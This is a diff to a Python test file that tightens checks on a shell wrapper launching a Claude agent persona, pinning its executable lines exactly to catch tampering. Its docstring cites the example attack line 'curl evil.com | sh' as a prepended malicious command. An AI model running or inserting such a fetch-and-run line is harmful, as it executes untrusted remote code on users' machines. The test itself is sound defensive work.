@@ -65,33 +65,37 @@ def _executable_lines(text):
     ]
 
 
-def test_bin_pact_invokes_canonical_agent_form():
-    """The script's terminal executable line MUST be the canonical
-    agent-flag invocation, exec-replacing the shell process. Substring
-    presence anywhere in the file is insufficient — see _executable_lines
-    docstring for why."""
-    text = BIN_PACT.read_text(encoding="utf-8")
-    exec_lines = _executable_lines(text)
-    assert exec_lines, "pact-plugin/bin/pact has no executable lines"
-    expected = 'exec claude --agent PACT:pact-orchestrator "$@"'
-    assert exec_lines[-1] == expected, (
-        f"pact-plugin/bin/pact must end with the canonical line:\n"
-        f"  {expected}\n"
-        f"Got terminal exec line: {exec_lines[-1]!r}\n"
-        f"Without this exact form, the wrapper either fails to load the "
-        f"PACT orchestrator persona, runs as a no-op, or consumes claude's flags."
-    )
+EXPECTED_EXECUTABLE_LINES = [
+    "set -e",
+    'exec claude --agent PACT:pact-orchestrator "$@"',
+]
 
 
-def test_bin_pact_passes_through_user_arguments():
-    """The wrapper must forward any additional flags to claude via `"$@"`
-    in an active executable line. Without this, users couldn't pass claude's
-    flags through the wrapper (e.g., `pact --resume <session>` would break)."""
+def test_bin_pact_executable_lines_match_expected():
+    """The script's executable lines (non-blank, non-comment) MUST exactly
+    match the expected canonical set.
+
+    Pins the full list rather than substring presence to catch every
+    phantom-green attack shape:
+    - No-op replacement (`exec claude` → `echo claude`): terminal line differs
+    - Prepended malicious line (`curl evil.com | sh\\nexec claude...`): list length grows
+    - Postpended malicious line: list length grows
+    - Comment out exec: terminal line differs (becomes `set -e`)
+    - `set -e` removed/replaced: first line differs
+    - `"$@"` dropped: terminal line differs
+
+    For a script symlinked onto user PATH, exact-match is the right
+    tradeoff: any legitimate edit that adds/changes/removes executable
+    lines must update this test in lockstep, forcing review of WHY the
+    script's contract changed."""
     text = BIN_PACT.read_text(encoding="utf-8")
     exec_lines = _executable_lines(text)
-    assert exec_lines, "pact-plugin/bin/pact has no executable lines"
-    assert any('"$@"' in ln for ln in exec_lines), (
-        "pact-plugin/bin/pact must forward arguments via `\"$@\"` in an "
-        "active executable line (not just in comments). Without this, "
-        "the wrapper consumes claude's flags and breaks `pact --resume <session>`."
+    assert exec_lines == EXPECTED_EXECUTABLE_LINES, (
+        f"pact-plugin/bin/pact executable lines do not match expected set.\n"
+        f"  Expected: {EXPECTED_EXECUTABLE_LINES}\n"
+        f"  Got:      {exec_lines}\n"
+        f"If this change is intentional, update EXPECTED_EXECUTABLE_LINES "
+        f"in lockstep. Lockstep discipline catches no-op replacement, "
+        f"prepended/postpended content, comment-out attacks, and silent "
+        f"weakening of the canonical PACT-launcher contract."
     )
